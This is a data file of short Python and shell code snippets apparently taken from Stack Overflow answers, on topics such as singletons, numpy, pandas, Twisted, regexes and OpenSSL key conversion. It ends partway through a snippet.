@singleton
class EventManager:
    def __init__(self):
        self.events = []
    def add_event(self, event):
        self.events.append(event)
    def print_events(self):
        print("Events : {}".format(self.events))

EventManager.add_event(0)
EventManager.add_event(1)
EventManager.add_event(2)
EventManager.print_events()
</snippet></ROW><ROW><id>20373044</id><snippet>Events : [0, 1, 2]
</snippet></ROW><ROW><id>20373044</id><snippet>The thing is that I initialize the class with a variable like EventManager(var), what shall I do in this case?</snippet></ROW><ROW><id>20373044</id><snippet>EventManager</snippet></ROW><ROW><id>20373044</id><snippet>EventManager</snippet></ROW><ROW><id>20373044</id><snippet>def singleton_with_args(*args, **kwargs):
    def wrapper(cls):
        return cls(*args, **kwargs)
    return wrapper

@singleton_with_args(0)
class EventManager:
    def __init__(self, first_event):
        self.events = [first_event]
    def add_event(self, event):
        self.events.append(event)
    def print_events(self):
        print("Events : {}".format(self.events))

EventManager.add_event(1)
EventManager.add_event(2)
EventManager.add_event(3)
EventManager.print_events()
</snippet></ROW><ROW><id>20373044</id><snippet>Events : [0, 1, 2, 3]
</snippet></ROW><ROW><id>20373171</id><snippet>ERROR_ACCESS_DENIED</snippet></ROW><ROW><id>20373171</id><snippet>DestroyWindow()</snippet></ROW><ROW><id>20373171</id><snippet>WM_DESTROY</snippet></ROW><ROW><id>20373188</id><snippet>os.popen</snippet></ROW><ROW><id>20373188</id><snippet>subprocess</snippet></ROW><ROW><id>20373188</id><snippet>import subprocess
import sys    

script, filename = sys.argv

output = subprocess.check_output(["cacls", filename]).splitlines()

for i in output:
    print(i)
</snippet></ROW><ROW><id>20373233</id><snippet>print "Phone number:", info.get_numbers()
</snippet></ROW><ROW><id>20373375</id><snippet>numpy.array(old_matrix, dtype=bool)
</snippet></ROW><ROW><id>20373375</id><snippet>old_matrix != 0
</snippet></ROW><ROW><id>20373487</id><snippet>Thread-N</snippet></ROW><ROW><id>20373487</id><snippet>N</snippet></ROW><ROW><id>20373945</id><snippet>int</snippet></ROW><ROW><id>20373945</id><snippet>astype</snippet></ROW><ROW><id>20373945</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; np.random.seed(5)
&gt;&gt;&gt; a = np.random.random([3,3]) &gt; 0.5
&gt;&gt;&gt; b = np.random.random([3,3]) &gt; 0.5
</snippet></ROW><ROW><id>20373945</id><snippet>bool</snippet></ROW><ROW><id>20373945</id><snippet>&gt;&gt;&gt; a
array([[False,  True, False],
       [ True, False,  True],
       [ True,  True, False]], dtype=bool)
</snippet></ROW><ROW><id>20373945</id><snippet>&gt;&gt;&gt; np.dot(a.astype(np.int), b.astype(np.int))
array([[0, 0, 1],
       [0, 0, 1],
       [0, 0, 2]])
</snippet></ROW><ROW><id>20374035</id><snippet>word = f.readline().split("X Points = ")[1].strip()
</snippet></ROW><ROW><id>20374035</id><snippet>data = "X Points = 10"
print data.split("X Points = ")
</snippet></ROW><ROW><id>20374035</id><snippet>['', '10']
</snippet></ROW><ROW><id>20374035</id><snippet>[1]</snippet></ROW><ROW><id>20374243</id><snippet>runserver</snippet></ROW><ROW><id>20374334</id><snippet>for _ in range(0,200):
    url = coop(url)
</snippet></ROW><ROW><id>20374334</id><snippet>url</snippet></ROW><ROW><id>20374441</id><snippet>NaN</snippet></ROW><ROW><id>20374441</id><snippet>Not a Number</snippet></ROW><ROW><id>20374441</id><snippet>np.float</snippet></ROW><ROW><id>20374441</id><snippet>&gt;&gt;&gt; np.finfo(np.float)
finfo(resolution=1e-15, min=-1.7976931348623157e+308, max=1.7976931348623157e+308, dtype=float64)
</snippet></ROW><ROW><id>20374441</id><snippet>&gt;&gt;&gt; np.finfo(np.float128)
finfo(resolution=1e-18, min=-1.18973149536e+4932, max=1.18973149536e+4932, dtype=float128)
</snippet></ROW><ROW><id>20374625</id><snippet>p = list(runloopg(10,0.1,6))
</snippet></ROW><ROW><id>20374780</id><snippet>with open('palavras.txt', 'r+') as f:
    for lendo in f:
        print palavra + lendo,
</snippet></ROW><ROW><id>20374909</id><snippet>content = ''
</snippet></ROW><ROW><id>20374909</id><snippet>del content
</snippet></ROW><ROW><id>20374909</id><snippet>A.portal()</snippet></ROW><ROW><id>20374909</id><snippet>passItToA()</snippet></ROW><ROW><id>20374996</id><snippet>build()</snippet></ROW><ROW><id>20374996</id><snippet>MyApp has no attribute rect</snippet></ROW><ROW><id>20374996</id><snippet>root.bind</snippet></ROW><ROW><id>20374996</id><snippet>MyApp._update_rect</snippet></ROW><ROW><id>20374996</id><snippet>root._update_rect</snippet></ROW><ROW><id>20374996</id><snippet>root._update_rect</snippet></ROW><ROW><id>20374996</id><snippet>class MyApp(App):
    title = 'My App'
    def build(self):
        root = RootWidget()
        root.bind(
            size=root._update_rect,
            pos=root._update_rect)
</snippet></ROW><ROW><id>20375091</id><snippet>raw_input</snippet></ROW><ROW><id>20375091</id><snippet>reactor.callFromThread(reactor.stop)</snippet></ROW><ROW><id>20375091</id><snippet>raw_input</snippet></ROW><ROW><id>20375091</id><snippet>sys.stdin</snippet></ROW><ROW><id>20375091</id><snippet>raw_input</snippet></ROW><ROW><id>20375150</id><snippet>base</snippet></ROW><ROW><id>20375150</id><snippet>s.resample('24h', base=5)
</snippet></ROW><ROW><id>20375150</id><snippet>In [35]: idx = pd.date_range('2012-01-01 00:00:00', freq='5min', periods=24*12*3)

In [36]: s = pd.Series(np.arange(len(idx)), index=idx)

In [38]: s.resample('24h', base=5)
Out[38]: 
2011-12-31 05:00:00     29.5
2012-01-01 05:00:00    203.5
2012-01-02 05:00:00    491.5
2012-01-03 05:00:00    749.5
Freq: 24H, dtype: float64
</snippet></ROW><ROW><id>20375212</id><snippet>from fpdf import FPDF
import sys

x1, x2, y = [int(arg) for arg in sys.argv[1:4]]

pdf=FPDF()
pdf.add_page()
pdf.set_font('Arial', 'B', 16)
pdf.set_xy(x1, y)
pdf.cell(0, 10, 'name')
pdf.set_xy(x2, y)
pdf.cell(0, 10, 'course')

pdf.output('tuto_%d_%d_%d.pdf' % (x1, x2, y),'F')
</snippet></ROW><ROW><id>20375258</id><snippet>plt.show()</snippet></ROW><ROW><id>20375258</id><snippet>figure</snippet></ROW><ROW><id>20375258</id><snippet>axis</snippet></ROW><ROW><id>20375258</id><snippet>plt.show()</snippet></ROW><ROW><id>20375258</id><snippet>import matplotlib.pyplot as plt
import numpy as np

def plotter ( ax, col ):
    data = np.random.normal( size=(50, 2 ) )
    x, y = data[:, 0], data[:, 1 ]
    ax.scatter( x, y, color=col )

fig = plt.figure()
ax = fig.add_axes([0.2, 0.2, 0.7, 0.6])

plotter( ax, 'Blue' )
plotter( ax, 'Red' )
fig.show( )
</snippet></ROW><ROW><id>20375607</id><snippet>urllib.urlretrieve("images", "thisistest")
</snippet></ROW><ROW><id>20375607</id><snippet>urllib.urlretrieve(images, thisistest)
</snippet></ROW><ROW><id>20375607</id><snippet>images</snippet></ROW><ROW><id>20375607</id><snippet>name</snippet></ROW><ROW><id>20375607</id><snippet>location = os.path.abspath("C:/temp/coursework/")

for i in images:
    name = os.path.basename(i)
    thisistest = os.path.join(location, name)
    urllib.urlretrieve(i, thisistest)
</snippet></ROW><ROW><id>20375638</id><snippet>\d+</snippet></ROW><ROW><id>20375638</id><snippet>[0-9]</snippet></ROW><ROW><id>20375638</id><snippet>\d-</snippet></ROW><ROW><id>20375638</id><snippet>-</snippet></ROW><ROW><id>20375638</id><snippet>\w+</snippet></ROW><ROW><id>20375638</id><snippet>[a-zA-Z0-9_]</snippet></ROW><ROW><id>20375638</id><snippet>\w-</snippet></ROW><ROW><id>20375638</id><snippet>-</snippet></ROW><ROW><id>20375692</id><snippet>pd.merge(frame_1, frame_2, left_on = 'county_ID', right_on = 'countyid')
</snippet></ROW><ROW><id>20375692</id><snippet>pd.merge(frame_1, frame_2, how = 'left', left_on = 'county_ID', right_on = 'countyid')
</snippet></ROW><ROW><id>20375712</id><snippet>v[0]</snippet></ROW><ROW><id>20375712</id><snippet>v[1]</snippet></ROW><ROW><id>20375712</id><snippet>v[1]</snippet></ROW><ROW><id>20375712</id><snippet>v[0]</snippet></ROW><ROW><id>20375712</id><snippet>d</snippet></ROW><ROW><id>20375712</id><snippet>d = collections.defaultdict(lambda: [0, []])
</snippet></ROW><ROW><id>20375745</id><snippet>-nodes</snippet></ROW><ROW><id>20375745</id><snippet>openssl pkcs12 -nocerts -out Pro_Key.pem -in App.p12 -nodes
</snippet></ROW><ROW><id>20375745</id><snippet>openssl pkcs12 -nocerts -out Pro_Key.pem -in App.p12
</snippet></ROW><ROW><id>20375745</id><snippet>openssl rsa -in haspassword.pem -out nopassword.pem
</snippet></ROW><ROW><id>20375773</id><snippet>int</snippet></ROW><ROW><id>20375773</id><snippet>''</snippet></ROW><ROW><id>20375773</id><snippet>''</snippet></ROW><ROW><id>20375773</id><snippet>form.getvalue('opt_12', '')
</snippet></ROW><ROW><id>20375773</id><snippet>form.getvalue('opt_12', '0')
</snippet></ROW><ROW><id>20375773</id><snippet>res12 = int(form.getvalue('opt_12', '0'))
...
...
...
</snippet></ROW><ROW><id>20375827</id><snippet>pass</snippet></ROW><ROW><id>20375827</id><snippet>continue</snippet></ROW><ROW><id>20375827</id><snippet>URLError</snippet></ROW><ROW><id>20375827</id><snippet>abrindo</snippet></ROW><ROW><id>20375893</id><snippet>class Test(object):
    def func(self, text):
        print str(text)

test = Test()
test.func('This is a bunch of text')
</snippet></ROW><ROW><id>20375993</id><snippet>x = lambda: magic
x.foo = 1
x.bar = 2
</snippet></ROW><ROW><id>20375993</id><snippet>__dict__</snippet></ROW><ROW><id>20376166</id><snippet>from twisted.internet import defer, task
from twisted.web.client import getPage

BATCH_SIZE = 5

def main_task(reactor):
    def fetch_urls():
        for url in get_urls():
            yield getPage(url).addCallback(parse)

    coop = task.Cooperator()
    urls = fetch_urls()

    return (defer.DeferredList([coop.coiterate(urls)
                               for _ in xrange(BATCH_SIZE)])
            .addCallback(task_finished))

task.react(main_task)
</snippet></ROW><ROW><id>20376166</id><snippet>parse</snippet></ROW><ROW><id>20376166</id><snippet>Deferred</snippet></ROW><ROW><id>20376166</id><snippet>getPage</snippet></ROW><ROW><id>20376166</id><snippet>Deferred</snippet></ROW><ROW><id>20376166</id><snippet>coiterate</snippet></ROW><ROW><id>20376166</id><snippet>parse</snippet></ROW><ROW><id>20376166</id><snippet>task.react</snippet></ROW><ROW><id>20376166</id><snippet>from twisted.internet import defer, task
from twisted.web.client import getPage

PARALLEL_FETCHES = 5
PARALLEL_PARSES = 10

def main_task(reactor):
    parseSemaphore = defer.DeferredSemaphore(PARALLEL_PARSES)

    def parseWhenReady(r):
        def parallelParse(_):
            parse(r).addBoth(
                lambda result: parseSemaphore.release().addCallback(
                    lambda _: result
                )
            )
        return parseSemaphore.acquire().addCallback(parallelParse)

    def fetch_urls():
        for url in get_urls():
            yield getPage(url).addCallback(parseWhenReady)

    coop = task.Cooperator()
    urls = fetch_urls()

    return (defer.DeferredList([coop.coiterate(urls)
                               for _ in xrange(PARALLEL_FETCHES)])
            .addCallback(lambda done:
                         defer.DeferredList(
                            [parseSemaphore.acquire()
                             for _ in xrange(PARALLEL_PARSES)]
                         ))
            .addCallback(task_finished))

task.react(main_task)
</snippet></ROW><ROW><id>20376166</id><snippet>parseWhenReady</snippet></ROW><ROW><id>20376166</id><snippet>Deferred</snippet></ROW><ROW><id>20376166</id><snippet>acquire</snippet></ROW><ROW><id>20376166</id><snippet>parallelParse</snippet></ROW><ROW><id>20376166</id><snippet>Deferred</snippet></ROW><ROW><id>20376166</id><snippet>parse</snippet></ROW><ROW><id>20376166</id><snippet>release</snippet></ROW><ROW><id>20376222</id><snippet>class Parent(object):
    def __init__(self, number):
        self.variable_to_access = "I want this"
        self.object_list = [] for i in range(number): 
            # Pass in a reference to the parent class when constructing our "inner class"
            self.object_list.append(Object_In_List(self, i))

class Object_In_List(object):
    # We need a reference to our parent class
    def __init__(self, parent, i):
        self.parent = parent

    # ... So we can forward attribute lookups on to the parent
    def __getattr__(self, name):
        return getattr(self.parent, name)

    # Now we can treat members of the parent class as if they were our own members (just like Java inner classes)
    def my_method(self):
        # You probably want to do something other than print here
        print(self.variable_to_access)
</snippet></ROW><ROW><id>20376318</id><snippet>service.userUsageReport().get(userKey='all',
                              date='2013-12-02',
                              parameters='docs:num_docs_shared_outside_domain').execute()
</snippet></ROW><ROW><id>20376888</id><snippet>refresh: 185</snippet></ROW><ROW><id>20376888</id><snippet>HTTPRefreshProcessor</snippet></ROW><ROW><id>20376888</id><snippet>set_handle_refresh</snippet></ROW><ROW><id>20376888</id><snippet>browser.set_handle_refresh(False) # &lt;-----
browser.open(url, timeout=2.0)
</snippet></ROW><ROW><id>20377019</id><snippet>c</snippet></ROW><ROW><id>20377019</id><snippet>a</snippet></ROW><ROW><id>20377019</id><snippet>c = a
</snippet></ROW><ROW><id>20377019</id><snippet>c = a[:]
</snippet></ROW><ROW><id>20377019</id><snippet>copy.copy</snippet></ROW><ROW><id>20377019</id><snippet>import copy

c = copy.copy(a)
</snippet></ROW><ROW><id>20377019</id><snippet>&gt;&gt;&gt; a = range(5)
&gt;&gt;&gt; c = a[:]  # &lt;-- make a copy
&gt;&gt;&gt; c.append(10)
&gt;&gt;&gt; a
[0, 1, 2, 3, 4]
&gt;&gt;&gt; c
[0, 1, 2, 3, 4, 10]
&gt;&gt;&gt; a is c
False
&gt;&gt;&gt; c = a    # &lt;--- make `c` reference the same list
&gt;&gt;&gt; a is c
True
</snippet></ROW><ROW><id>20377136</id><snippet>get_url</snippet></ROW><ROW><id>20377136</id><snippet>url</snippet></ROW><ROW><id>20377136</id><snippet>Bottle.get_url</snippet></ROW><ROW><id>20377371</id><snippet>vdCacheType = {'AWB' : 'Always WriteBack', 'WB': 'Write Back',
               'NR': 'No Read Ahead', 'Ra': 'Read Ahead Adaptive',
               'WT': 'Write Through',  'R' : 'Read Ahead Always',
               'D': 'Direct IO', 'C': 'Cached' }

import re
rx = re.compile('|'.join(sorted(vdCacheType, key=len, reverse=True)))
print ', '.join([vdCacheType[m] for m in rx.findall('NRWTD')])
# No Read Ahead, Write Through, Direct IO
</snippet></ROW><ROW><id>20377371</id><snippet>RAWBC</snippet></ROW><ROW><id>20377371</id><snippet>Read Ahead Always, Always WriteBack, Cached</snippet></ROW><ROW><id>20377690</id><snippet>class ReportExceptions(object):
    def __enter__(self):
        pass

    def __exit__(self, exc_type, exc_value, tb):
        if exc_type is not None:
            print("Sending mail to admin about {0!r}".format(exc_value))
</snippet></ROW><ROW><id>20377690</id><snippet>with ReportExceptions():
    # your code here..
</snippet></ROW><ROW><id>20377690</id><snippet>__exit__()</snippet></ROW><ROW><id>20377690</id><snippet>return True</snippet></ROW><ROW><id>20377690</id><snippet>class ReportExceptions(object):
    def __init__(self, email):
        self.email = email

    def __enter__(self):
        pass

    def __exit__(self, exc_type, exc_value, tb):
        if exc_type is not None:
            print("Sending mail to {0!r} about {1!r}"
                  "".format(self.email, exc_value))

report_exceptions = ReportExceptions('foo@bar.com')
</snippet></ROW><ROW><id>20377690</id><snippet>with report_exceptions:
    # ..your code here..
</snippet></ROW><ROW><id>20377690</id><snippet>try:
    100 / 0
except ZeroDivisionError, e:
    exc_info = sys.exc_info()
</snippet></ROW><ROW><id>20377690</id><snippet>raise exc_info[0], exc_info[1], exc_info[2]
</snippet></ROW><ROW><id>20377690</id><snippet>raise expression, expression, expression</snippet></ROW><ROW><id>20377690</id><snippet>tb</snippet></ROW><ROW><id>20377690</id><snippet>tb.tb_frame.f_locals</snippet></ROW><ROW><id>20377690</id><snippet>tb.tb_next.tb_frame</snippet></ROW><ROW><id>20377690</id><snippet>inspect</snippet></ROW><ROW><id>20377904</id><snippet>sudo easy_install pycrypto
</snippet></ROW><ROW><id>20377904</id><snippet>sudo easy_install -Z pycrypto
</snippet></ROW><ROW><id>20377904</id><snippet>pip install pycrypto 
</snippet></ROW><ROW><id>20377904</id><snippet>easy_install pip
</snippet></ROW><ROW><id>20377904</id><snippet>- name: pycrypto
  version: latest
</snippet></ROW><ROW><id>20377904</id><snippet>libraries:</snippet></ROW><ROW><id>20378206</id><snippet>import time

last_time = time.time()
#start of event catching loop

if time.time() - last_time &gt;= 10
   print buttonCountVariable
   last_time = time.time()
</snippet></ROW><ROW><id>20378232</id><snippet>iglob</snippet></ROW><ROW><id>20378232</id><snippet>literal_eval</snippet></ROW><ROW><id>20378232</id><snippet>deque</snippet></ROW><ROW><id>20378232</id><snippet>from collections import deque
from glob import iglob
import ast

def get_lists(pattern):
    for filename in iglob(pattern):
        with open(filename) as fin:
            penultimate = deque(fin, 2)[0]
            yield ast.literal_eval(penultimate)

data = list(get_lists('chr*.txt'))
</snippet></ROW><ROW><id>20378322</id><snippet>def flatten(aDict, output=None):
    if output is None:
        output = {}
    for key in aDict:
        if isinstance(aDict[key], dict):
            flatten(aDict[key], output)
        output[key] = aDict[key]
    return output
</snippet></ROW><ROW><id>20378322</id><snippet>final_output = {}
flat_dict = flatten(original_dict)
for key in needed_keys:
    for k in flat_dict:
        if k.endswith(key):
            final_output[key] = flat_dict[k]
            break
    if not key in final_output:
        final_output[key] = None
</snippet></ROW><ROW><id>20378406</id><snippet>shape</snippet></ROW><ROW><id>20378406</id><snippet>shape</snippet></ROW><ROW><id>20378406</id><snippet>numpy.array([[]]).shape   # (1L, 0L)
numpy.array([[]]).transpose.shape  # (0L, 1L)
numpy.array([]).shape     # (0L, )
</snippet></ROW><ROW><id>20378406</id><snippet>reshape</snippet></ROW><ROW><id>20378406</id><snippet>a2.shape()      # (0L,)
a2 = a2.reshape((0,2))
a2.shape()      # (0L, 2L)
</snippet></ROW><ROW><id>20378481</id><snippet>x = 'hba_test'
y = 'abort/"Basic Sanity" delayedabort/"Abort Control List"'
disable = False
test = 'disable='

#print header to seperate tests
l1 = len(x)
l2 = len(y)


if disable:
    headerBreak ="+" + "="*(l1+12) + "+"
    print headerBreak
    print "| Skipping: %s |" % x
else:
    headerBreak =  "+" + "="*(max(l1,l2)+11) + "+"
    print headerBreak
    print "| Running: %s" % x, ' '*(l2-l1)+ '|'
    if 'disable=' in test:
       print "| Skipping:%s |" % y 
print headerBreak
</snippet></ROW><ROW><id>20378481</id><snippet>+=================================================================+
| Running: hba_test                                               |
| Skipping:abort/"Basic Sanity" delayedabort/"Abort Control List" |
+=================================================================+

+====================+
| Skipping: hba_test |
+====================+
</snippet></ROW><ROW><id>20378481</id><snippet>x = 'hba_test'
y = 'abort/"Basic Sanity" delayedabort/"Abort Control List"'
disable = False
test = 'disable='

#print header to seperate tests
def asciiBlock(lineList):
    maxLength = 0
    lines = []
    for line in lineList:
        newLine = ': '.join(line)
        lines.append(newLine)
        if maxLength&lt;len(newLine):
            maxLength=len(newLine)


    asciiArt = '+'+'='*(maxLength+2)+'+'
    newLineList = [asciiArt]
    for line in lines:
        newLineList.append('| '+ line + ' '*(maxLength-len(line))+' |')

    newLineList.append(asciiArt)

    return '\n'.join(newLineList)


if disable:
    lineList = [('Skipping',x)]

else:
    lineList = [('Running',x)]
    if 'disable=' in test:
        lineList.append(('Skipping',y))

print asciiBlock(lineList)
</snippet></ROW><ROW><id>20378516</id><snippet>glob.glob</snippet></ROW><ROW><id>20378516</id><snippet>import os, re
import glob

pattern = re.compile('word1(.*?)word3', flags=re.S)
for file in glob.glob('*.txt'):
    with open(file) as fp:
        for result in pattern.findall(fp.read()):
            print result
</snippet></ROW><ROW><id>20378589</id><snippet>facts</snippet></ROW><ROW><id>20378589</id><snippet>__init__</snippet></ROW><ROW><id>20378589</id><snippet>class Fruit:

   def __init__(self, FruitName):
       self.name = FruitName
       self.facts = []

   def addfact(self, FruitName):
       ...
</snippet></ROW><ROW><id>20378660</id><snippet>json</snippet></ROW><ROW><id>20378660</id><snippet>ensure_ascii=False</snippet></ROW><ROW><id>20378660</id><snippet>&gt;&gt;&gt; print json.dumps({'a': u'ã'})
{"a": "\u00e3"}
&gt;&gt;&gt; print json.dumps({'a': u'ã'}, ensure_ascii=False)
{"a": "ã"}
</snippet></ROW><ROW><id>20378660</id><snippet>json.dump</snippet></ROW><ROW><id>20378970</id><snippet>[m for m in (get_close_matches(p, rpms) for p in pkgs) if m]
</snippet></ROW><ROW><id>20378970</id><snippet>p</snippet></ROW><ROW><id>20378970</id><snippet>m</snippet></ROW><ROW><id>20379021</id><snippet>&gt;&gt;&gt; regex = r'^(?:(?:[a-z\d\-]{1,100}\~)?(?:(?!\-)[a-z\d\-\.]{1,100}:)?(?!-)[a-z\d\-]{0,99}[a-z\d])$'
&gt;&gt;&gt; print(re.match(regex, 'HelloWorld'))
None
&gt;&gt;&gt; print(re.match(regex, 'helloworld'))
&lt;_sre.SRE_Match object at 0x13ac308&gt;
</snippet></ROW><ROW><id>20379050</id><snippet>'item'</snippet></ROW><ROW><id>20379050</id><snippet>.item</snippet></ROW><ROW><id>20379050</id><snippet>.status</snippet></ROW><ROW><id>20379050</id><snippet>{{ mymodel.status.status }}
</snippet></ROW><ROW><id>20379117</id><snippet>class genericParser(HTMLParser):
   def __init__ (self):
       HTMLParser.__init__ (self)
       self.divFound = False
       self.buff = ""
       self.level = 0

   def computeRecord (self, tag, attrs):
        mystr = "&lt;" + tag + " "
        for att, val in attrs:
            mystr += att+"='"+val+ "' "
        mystr += "&gt;"
        return mystr

   def handle_starttag (self, tag, attrs):
       if tag == "div" and ("class", "good") in attrs:
           self.divFound = True
       elif self.divFound:
          self.level += 1
          self.buff += self.computeRecord (tag, attrs)

   def handle_data (self, data):
       if self.divFound:
          self.buff += data


   def handle_endtag (self, tag):
      if self.divFound:
         self.buff += "&lt;/" + tag + "&gt;"
         self.level -= 1
         if (self.level == 0):
            self.divFound = False
            print self.buff
</snippet></ROW><ROW><id>20379117</id><snippet>&lt;ul&gt;
     &lt;li&gt;test1&lt;/li&gt;
     &lt;li&gt;test2&lt;/li&gt;
&lt;/ul&gt;
</snippet></ROW><ROW><id>20379117</id><snippet>soup = BeaufitulSoup (html)
div = soup("div", {"class" : "good"})
children = div[0].findChildren ()
print children[0]   #### desired output
</snippet></ROW><ROW><id>20379520</id><snippet>item = stats.get(field) or very_expensive_initializer(field)
item.add(value)
</snippet></ROW><ROW><id>20379520</id><snippet>stats[field]</snippet></ROW><ROW><id>20379520</id><snippet>item = stats[field] if field in stats else very_expensive_initializer(field)
item.add(value)
</snippet></ROW><ROW><id>20379520</id><snippet>or</snippet></ROW><ROW><id>20379520</id><snippet>very_expensive_initializer(field)</snippet></ROW><ROW><id>20379520</id><snippet>stats</snippet></ROW><ROW><id>20379520</id><snippet>if field not in stats:
    stats[field] = very_expensive_initializer(field)
</snippet></ROW><ROW><id>20379520</id><snippet>try:
    item = stats[field]
except KeyError:
    item = stats[field] = very_expensive_initializer(field)
</snippet></ROW><ROW><id>20379520</id><snippet>field</snippet></ROW><ROW><id>20379520</id><snippet>stats</snippet></ROW><ROW><id>20379520</id><snippet>field</snippet></ROW><ROW><id>20379520</id><snippet>stats</snippet></ROW><ROW><id>20379520</id><snippet>dict</snippet></ROW><ROW><id>20379520</id><snippet>__missing__</snippet></ROW><ROW><id>20379520</id><snippet>class subclassed_dict(dict):
    def __missing__(self, key):
        item = self[key] = very_expensive_initializer(key)
        return item
</snippet></ROW><ROW><id>20379520</id><snippet>stats</snippet></ROW><ROW><id>20379520</id><snippet>stats = subclassed_dict()
</snippet></ROW><ROW><id>20379520</id><snippet>__missing__</snippet></ROW><ROW><id>20379520</id><snippet>&gt;&gt;&gt; def very_expensive_initializer(field):
...     print 'Doing loads of work'
...     return set()
... 
&gt;&gt;&gt; class subclassed_dict(dict):
...     def __missing__(self, key):
...         item = self[key] = very_expensive_initializer(key)
...         return item
... 
&gt;&gt;&gt; stats = subclassed_dict()
&gt;&gt;&gt; stats['foo'].add(2)
Doing loads of work
&gt;&gt;&gt; stats['foo'].add(3)
&gt;&gt;&gt; stats['foo'].add(4)
&gt;&gt;&gt; stats['bar']
Doing loads of work
set([])
&gt;&gt;&gt; stats['bar']
set([])
</snippet></ROW><ROW><id>20380308</id><snippet>print(string, end="")
</snippet></ROW><ROW><id>20380308</id><snippet>from __future__ import print_function
print(string, end="")
</snippet></ROW><ROW><id>20380308</id><snippet>print string,    # This way adds a space at the end.
</snippet></ROW><ROW><id>20380308</id><snippet>&gt;&gt;&gt; for i in xrange(10):
        print i,
1 2 3 4 5 6 7 8 9 10
</snippet></ROW><ROW><id>20380308</id><snippet>&gt;&gt;&gt; numbers = []
&gt;&gt;&gt; for i in xrange(10):
       numbers.append(i)
&gt;&gt;&gt; print "".join(map(str, numbers))
12345678910
</snippet></ROW><ROW><id>20380308</id><snippet>import</snippet></ROW><ROW><id>20380308</id><snippet>print_function</snippet></ROW><ROW><id>20380393</id><snippet>CommUtilities.appendChecksum()</snippet></ROW><ROW><id>20380393</id><snippet>buff</snippet></ROW><ROW><id>20380393</id><snippet>    def appendChecksum(self, buff):
        buff = buff[:]  # make copy
        buff.append(self.calculateChecksum(buff))
        return buff
</snippet></ROW><ROW><id>20380591</id><snippet>a</snippet></ROW><ROW><id>20380591</id><snippet>x</snippet></ROW><ROW><id>20380591</id><snippet>x</snippet></ROW><ROW><id>20380591</id><snippet>x = np.random.normal(1., 0.1, 1000)
x.sort() # sorts in place
print simps(norm_func(x, 1., 0.1), x)
#0.999914876748
</snippet></ROW><ROW><id>20380591</id><snippet>s = np.sort(np.random.normal(1., 0.1, 10000))
print simps(norm_func(s, 1., 0.1), s)
#0.999943377731
</snippet></ROW><ROW><id>20380874</id><snippet>QStackedWidget</snippet></ROW><ROW><id>20380874</id><snippet>QStackedWidget</snippet></ROW><ROW><id>20380874</id><snippet>QStackedWidget</snippet></ROW><ROW><id>20381307</id><snippet>import cv
capture1 = cv.CaptureFromCAM(0)
if not capture1 :
    print "!!! Failed to open a camera interface"
    # Ideally, exit the application.

cv.SetCaptureProperty(capture1,cv.CV_CAP_PROPER_FRAME_WIDTH,320)  
cv.SetCaptureProperty(capture1,cv.CV_CAP_PROPER_FRAME_HEIGHT,240)
</snippet></ROW><ROW><id>20381307</id><snippet>while 1:
     frame = cv.QueryFrame(capture1);
     if not frame:
         print "!!! Failed to retrieve frame"
         break

     # Right now, your code overwrites the same file at every iteration of the loop.
     # It might be better to add a BREAK at the end for testing purposes.
     cv.SaveImage("camera.jpg", frame);

     # There's no need to call WaitKey() if the image is not displayed on a window.
     #cv.WaitKey(11)    

     print 'Done!'
</snippet></ROW><ROW><id>20381307</id><snippet>SaveImage()</snippet></ROW><ROW><id>20381307</id><snippet>SaveImage()</snippet></ROW><ROW><id>20381352</id><snippet>re.sub</snippet></ROW><ROW><id>20381352</id><snippet>flags</snippet></ROW><ROW><id>20381352</id><snippet>flags</snippet></ROW><ROW><id>20381352</id><snippet>flags</snippet></ROW><ROW><id>20381352</id><snippet>re.sub(pattern, repl, string, count=0, flags=0)
#                             ^^^^^^^
</snippet></ROW><ROW><id>20381352</id><snippet>&gt;&gt;&gt; re.sub("\D", '', '978-1-936978-09-0', flags=re.IGNORECASE)
'9781936978090'
</snippet></ROW><ROW><id>20381497</id><snippet>A1 = np.zeros((m, n))
A2 = np.zeros((m, n))
Anow = A1 # reference, not copy
Aafter = A2
while d &lt; 100:
    x = infectAll(Anow, Aafter, n,m,tau)
    Anow, Aafter = Aafter, Anow
</snippet></ROW><ROW><id>20381497</id><snippet>def infectAll(Ain, Aout, n, m, tau):
    for i in range(m):
        for j in range(n):
             if Anow[i,j] == 0:
                  Aafter[i,j] = infect(Anow, i, j, n, m, tau)
</snippet></ROW><ROW><id>20381633</id><snippet>inspect</snippet></ROW><ROW><id>20381633</id><snippet>ast</snippet></ROW><ROW><id>20381633</id><snippet>import ast
import inspect

class NodeTagger(ast.NodeVisitor):
    def __init__(self):
        self.class_attribute_names = {}

    def visit_Assign(self, node):
        for target in node.targets:
            self.class_attribute_names[target.id] = target.lineno

    # Don't visit Assign nodes inside Function Definitions.
    def visit_FunctionDef(self, unused_node):
        return None

def order_properties(model):
    properties = model._properties
    source = inspect.getsource(model)
    tree = ast.parse(source)
    visitor = NodeTagger()
    visitor.visit(tree)
    attributes = visitor.class_attribute_names
    model._ordered_property_list = sorted(properties, key=lambda x:attributes[x])
    return model


@order_properties
class Foo(object):
    c = 1
    b = 2
    a = 3

    # Add a _properties member to simulate an `ndb.Model`.
    _properties = {'a': object, 'b': object, 'c': object}

print Foo._ordered_property_list
</snippet></ROW><ROW><id>20381633</id><snippet>ndb.Model</snippet></ROW><ROW><id>20381633</id><snippet>_properties</snippet></ROW><ROW><id>20381633</id><snippet>dir</snippet></ROW><ROW><id>20381633</id><snippet>inspect.getmembers</snippet></ROW><ROW><id>20381633</id><snippet>order_properties</snippet></ROW><ROW><id>20381734</id><snippet>union</snippet></ROW><ROW><id>20381734</id><snippet>r.table('users').filter({"mail": mail}).limit(1).union([{}])[0]
</snippet></ROW><ROW><id>20381734</id><snippet>default</snippet></ROW><ROW><id>20381881</id><snippet>prob.set_log_stream(None)
prob.set_error_stream(None)
prob.set_warning_stream(None)
prob.set_results_stream(None)
</snippet></ROW><ROW><id>20381992</id><snippet>class Test(object):

    def run_operations(self, operation, *args, **kwargs):
        try:
            function = self.functions[operation]
        except KeyError:
            # some log ...
        else:
            function(self, args, kwargs)

    def function_a(self, *args, **kwargs):
        print "A"

    def function_b(self, *args, **kwargs):
        print "B"

    functions = {
        'operation_a' : function_a,
        'operation_b' : function_b,
        }
</snippet></ROW><ROW><id>20381992</id><snippet>getattr</snippet></ROW><ROW><id>20381992</id><snippet>def operation(func):
    func.is_operation = True
    return func

class Test(object):
    def run_operations(self, operation, *args, **kwargs):
        method = getattr(self, operation, None)
        if method is None:
            # raise or log or whatever
        elif not method.is_operation:
            # raise or log or whatever
        else:
